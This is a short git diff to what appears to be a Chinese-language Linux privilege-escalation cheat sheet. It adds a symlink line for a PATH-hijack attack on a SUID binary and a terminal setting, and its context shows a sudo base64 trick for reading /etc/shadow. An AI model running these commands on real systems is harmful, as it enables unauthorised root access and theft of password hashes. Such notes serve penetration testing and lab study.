@@ -261,6 +261,8 @@
 	echo $PATH
 	
 	/usr/local/bin/suid-env
+
+	ln -s /bin/sh cp
 ```
 
 - bash < 4.2
@@ -372,4 +374,10 @@
 	ATTACT=/etc/shadow
 	
 	sudo base64 "$ATTACT" | base64 --decode
+```
+
+## SSH 清屏
+
+```
+export TERM=xterm-256color
 ```
